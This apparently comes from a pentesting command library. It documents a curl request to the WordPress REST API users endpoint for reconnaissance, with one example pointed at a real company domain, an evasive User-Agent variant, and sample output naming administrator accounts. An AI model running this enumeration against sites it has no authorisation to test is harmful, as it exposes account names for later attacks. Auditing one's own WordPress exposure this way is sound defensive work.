---
data: 'curl -s http://target-site.com/wp-json/wp/v2/users'
tags:
  - recon
  - web
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 09abde86-d785-49f6-a3e6-37404b362ad6
created_at: '2025-12-14T17:30:27.213Z'
updated_at: '2025-12-14T17:30:27.213Z'
verified: false
validated: true
submitted: true
---
# curl-access-wp-rest-api

## Command

```bash
curl -s http://target-site.com/wp-json/wp/v2/users
```

## Description

This command uses curl to perform an unauthenticated GET request to the WordPress REST API users endpoint, retrieving a JSON list of all users including admins. It is used for quick reconnaissance of exposed user data on WordPress sites.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `http://target-site.com/wp-json/wp/v2/users` | The API endpoint URL; replace with actual target | Yes |

## Examples

### Basic Usage

```bash
curl -s http://affiliates.udemy.com/wp-json/wp/v2/users
```

### Advanced Usage

```bash
curl -s -H "User-Agent: Mozilla/5.0" http://target-site.com/wp-json/wp/v2/users | jq '.'
```

> Adds a browser-like User-Agent to mimic legitimate traffic and pipes to jq for pretty-printed JSON.

## Expected Output

A JSON array of user objects on success, e.g.:

```json
[
  {"id":1,"name":"Admin","slug":"hamza","roles":["administrator"]},
  {"id":2,"name":"User","slug":"imanrana","roles":["administrator"]}
]
```

If protected, returns HTTP 401 or empty array.

## Related

- [[Related Procedure: Enumerate-WordPress-Users-via-Exposed-REST-API]]
